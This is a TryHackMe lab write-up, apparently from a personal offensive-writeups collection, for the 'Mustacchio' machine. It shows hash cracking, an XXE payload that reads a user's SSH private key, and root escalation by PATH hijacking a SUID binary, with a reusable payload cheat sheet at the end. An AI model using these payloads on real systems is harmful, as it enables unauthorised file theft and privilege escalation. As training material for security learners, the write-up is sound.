# Mustacchio — TryHackMe Write-up

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue)
![OS](https://img.shields.io/badge/OS-Linux-lightgrey)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## Machine Information

| Attribute          | Details              |
|--------------------|----------------------|
| **Name**           | Mustacchio           |
| **Platform**       | TryHackMe            |
| **Difficulty**     | Easy                 |
| **OS**             | Linux (Ubuntu)       |
| **Date Completed** | April 2026           |

---

## Attack Chain

```
RECON       →  nmap + gobuster                      →  HTTP(80), Admin Panel(8765)
BACKUP      →  /etc/passwd + arquivo .bak exposto   →  estrutura XML esperada + hash
CRACK       →  hash admin                           →  acesso ao painel :8765
XXE         →  payload XML com tag <com>            →  id_rsa do barry via file://
SSH         →  ssh -i id_rsa barry@IP               →  shell como barry
USER FLAG   →  /home/barry/user.txt
SUID        →  /home/joe/live_log (SUID root)       →  executa tail sem path absoluto
HIJACK      →  PATH hijacking /tmp/tail             →  shell como root
ROOT FLAG   →  /root/root.txt
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

| Port     | Service | Version    | Note                              |
|----------|---------|------------|-----------------------------------|
| 22/tcp   | SSH     | OpenSSH    | —                                 |
| 80/tcp   | HTTP    | Apache     | Site principal                    |
| 8765/tcp | HTTP    | —          | Painel administrativo             |

### Directory Enumeration

```bash
gobuster dir -u http://<IP> \
  -w /usr/share/wordlists/dirb/common.txt \
  -o gobuster.txt
```

Arquivo relevante encontrado: `/etc/passwd` e backup `.bak` exposto no servidor.

O arquivo `.bak` revelou duas informações críticas:

1. A estrutura XML que o painel administrativo espera receber — incluindo a tag `<com>` como campo de output
2. Credenciais do admin em formato hash

```bash
# Cracking do hash
hashcat -m 0 <hash> /usr/share/wordlists/rockyou.txt
# ou
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Com as credenciais obtidas, acesso ao painel em `http://<IP>:8765/`.

---

## Initial Access

### XXE — XML External Entity Injection

O painel administrativo na porta 8765 processa XML enviado pelo usuário **sem desabilitar entidades externas**. Isso permite que o parser XML leia arquivos do sistema e injete o conteúdo na resposta.

**Por que a tag `<com>` é necessária:**

A análise do arquivo `.bak` revelou que o sistema só exibe conteúdo quando a tag `<com>` está presente no XML. Sem ela, o payload é processado mas não retorna output visível — comportamento de **Semi-blind XXE**.

**Estrutura do payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<root>
  <com>&xxe;</com>
</root>
```

**Fluxo da exploração:**

```
1. Enviar payload XML via painel :8765
2. O parser XML processa <!ENTITY xxe SYSTEM "file:///...">
3. O servidor lê o arquivo id_rsa do barry
4. Injeta o conteúdo dentro de <com>
5. A resposta HTTP contém a chave privada
6. Inspecionar via DevTools → Network → Response
```

> **Nota sobre Burp Suite:** Problemas de sandbox com Kali em modo root podem impedir o Burp de interceptar corretamente. Alternativa direta: **DevTools do browser → aba Network → selecionar a requisição → aba Response**. O conteúdo do XML retornado aparece integralmente, incluindo a chave privada.

**Salvar e formatar a chave RSA:**

A chave precisa de formatação correta para ser aceita pelo SSH e pelo `ssh2john`. Quebras de linha e espaços extras invalidam o arquivo.

```bash
# Criar o arquivo com formatação correta
nano id_rsa
# Colar a chave com cabeçalho e rodapé corretos:
# -----BEGIN RSA PRIVATE KEY-----
# [conteúdo em blocos]
# -----END RSA PRIVATE KEY-----

chmod 600 id_rsa
```

> **Por que criptografia é sensível à formatação:** Chaves SSH são codificadas em Base64 com quebras de linha a cada 64 caracteres. Um espaço extra ou linha faltando altera o parsing da estrutura ASN.1 subjacente, tornando a chave inválida. O `ssh2john` e o próprio cliente SSH rejeitam chaves com formatação incorreta.

**Caso a chave tenha passphrase:**

```bash
# Converter para formato do John
ssh2john id_rsa > id_rsa.hash

# Quebrar a passphrase
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Acesso SSH:**

```bash
ssh -i id_rsa barry@<IP>
```

---

## Post-Exploitation

```bash
cat /home/barry/user.txt
```

---

## Privilege Escalation

### Identificação — SUID com Path Relativo

```bash
find / -perm -4000 -type f 2>/dev/null
# /home/joe/live_log
```

```bash
# Inspecionar o binário
strings /home/joe/live_log | grep tail
# tail -f /var/log/nginx/access.log
# Sem caminho absoluto — usa apenas "tail"
```

O binário `live_log` pertence a `root` com bit SUID ativo. Ele chama `tail` usando apenas o nome do comando — sem `/usr/bin/tail`. Isso significa que o sistema busca `tail` na variável `$PATH` na ordem definida. Se um diretório controlável pelo atacante aparecer antes de `/usr/bin`, o sistema executa o `tail` falso com privilégios de root.

### PATH Hijacking

**Como o PATH funciona:**

```
$PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Quando o sistema busca "tail":
1. /usr/local/sbin/tail → não existe
2. /usr/local/bin/tail  → não existe
3. /usr/sbin/tail       → não existe
4. /usr/bin/tail        → existe → executa este

Se /tmp for inserido ANTES:
$PATH = /tmp:/usr/local/sbin:...
1. /tmp/tail → existe (nosso payload) → executa como root!
```

**Exploração:**

```bash
# Criar o "tail" falso em /tmp
echo '/bin/bash' > /tmp/tail
chmod +x /tmp/tail

# Colocar /tmp na frente do PATH
export PATH=/tmp:$PATH

# Executar o binário SUID
/home/joe/live_log

# O live_log chama "tail" → encontra /tmp/tail primeiro → executa /bin/bash como root
whoami
# root
```

```bash
cat /root/root.txt
```

---

## Flags

| File       | Path            | Flag  |
|------------|-----------------|-------|
| `user.txt` | `/home/barry/`  | —     |
| `root.txt` | `/root/`        | —     |

---

## Lições Aprendidas

**Arquivos de backup expostos entregam a estrutura interna da aplicação.** O `.bak` revelou o schema XML esperado e as credenciais do admin. Em qualquer enumeração web, extensões `.bak`, `.old`, `.backup`, `.sql` e `~` devem ser testadas ativamente — são os arquivos que desenvolvedores esquecem de proteger.

**XXE Semi-blind exige conhecimento prévio da estrutura de output.** Sem saber que a tag `<com>` era o campo de retorno visível, o payload estaria correto mas sem resposta observável. A lição: quando XXE não retorna output, analisar o código-fonte e qualquer arquivo de configuração ou backup disponível antes de assumir que a vulnerabilidade não existe.

**PATH hijacking funciona porque SUID herda o ambiente do processo pai.** O binário `live_log` executa como root (SUID), mas o `$PATH` usado é o do usuário que o chamou. Modificar `$PATH` antes de executar o binário é suficiente para interceptar qualquer comando chamado sem caminho absoluto. A correção é simples: usar sempre caminhos absolutos em binários SUID (`/usr/bin/tail` em vez de `tail`).

```bash
# Referência — identificar binários que chamam comandos sem caminho absoluto
strings /caminho/do/binario | grep -v "/" | grep -E "^[a-z]+"

# PATH hijacking — sequência
echo '/bin/bash' > /tmp/COMANDO
chmod +x /tmp/COMANDO
export PATH=/tmp:$PATH
./binario_suid

# XXE payload base
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><tag_de_output>&xxe;</tag_de_output></root>
```

---

## Tools Used

| Tool          | Purpose                                          |
|---------------|--------------------------------------------------|
| `nmap`        | Port scanning e detecção de serviços             |
| `gobuster`    | Enumeração de diretórios — descoberta do backup  |
| `hashcat`     | Quebra do hash de credencial do admin            |
| `ssh2john`    | Converter chave RSA para formato quebrável       |
| `john`        | Quebra da passphrase da chave RSA                |
| Browser DevTools | Captura do output XXE sem Burp Suite          |
| `strings`     | Análise do binário SUID para detectar PATH relativo |

---

## References

- [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) — processamento inseguro de XML
- [PayloadsAllTheThings — XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) — payloads e variações
- [HackTricks — PATH Hijacking](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path) — técnica detalhada

---

*UmbraNull · [github.com/igorleite97](https://github.com/igorleite97) · offensive-writeups*